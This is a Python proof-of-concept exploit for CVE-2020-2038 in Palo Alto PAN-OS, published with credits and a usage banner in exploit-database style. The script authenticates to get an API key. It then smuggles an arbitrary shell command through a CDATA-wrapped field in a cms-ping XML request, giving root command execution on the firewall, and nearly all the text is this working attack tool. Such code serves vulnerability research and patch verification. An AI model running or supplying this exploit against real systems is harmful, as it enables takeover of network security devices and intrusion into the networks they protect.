# Exploit Title: PAN-OS 10.0 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-08-13
# Exploit Author: UnD3sc0n0c1d0
# Software Link: https://security.paloaltonetworks.com/CVE-2020-2038
# Category: Web Application
# Version: <10.0.1, <9.1.4 and <9.0.10
# Tested on: PAN-OS 10.0 - Parrot OS
# CVE : CVE-2020-2038
#
# Description:
# An OS Command Injection vulnerability in the PAN-OS management interface that allows authenticated 
# administrators to execute arbitrary OS commands with root privileges.
# More info: https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/
# Credits: Mikhail Klyuchnikov and Nikita Abramov of Positive Technologies for discovering and reporting this issue.

#!/usr/bin/env python3

import requests
import urllib3
import sys
import getopt
import xmltodict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print('\n###########################################################################')
    print('# Proof of Concept for CVE-2020-2038                                      #')
    print('# Vulnerability discovered by Mikhail Klyuchnikov and Nikita Abramov of   #')
    print('# Positive Technologies                                                   #')
    print('# https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/ #')
    print('#                                                                         #')
    print('#                           Exploit by: Juampa Rodríguez (@UnD3sc0n0c1d0) #')
    print('###########################################################################')

def exploit(target,user,password,command):
    apiparam = {'type': 'keygen', 'user': user, 'password': password}
    apiresponse = requests.get(target+'api/', params=apiparam, verify=False)
    xmlparse = xmltodict.parse(apiresponse.content)
    apikey = xmlparse['response']['result']['key']
    payload = '<cms-ping><host>8.8.8.8</host><count>1</count><pattern>111<![CDATA[||'+command+'||]]></pattern></cms-ping>'
    parameters = {'cmd': payload, 'type': 'op', 'key': apikey}
    response = requests.get(target+'api', params=parameters, verify=False)
    print(response.text[50:-20])

def usage():
    print('\nusage: CVE-2020-2038.py\n\n')
    print('arguments:')
    print('     -h      show this help message and exit')
    print('     -t      target URL (ex: http://vulnerable.host/)')
    print('     -u      target administrator user')
    print('     -p      pasword of the defined user account')
    print('     -c      command you want to execute on the target\n')
    
def main(argv):
    if len(sys.argv) < 9:
        banner()
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv,"ht:u:p:c:")
    except getopt.GetoptError:
        banner()
        usage()
        sys.exit()
    for opt, arg in opts:
        if opt == '-h':
            usage()
            sys.exit()
        if opt == '-t':
            target = arg
        if opt == '-u':
            user = arg
        if opt == '-p':
            password = arg
        if opt == '-c':
            command = arg
    banner()
    exploit(target,user,password,command)
    sys.exit()

if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        print('Interrupted by users...')
    except:
        sys.exit()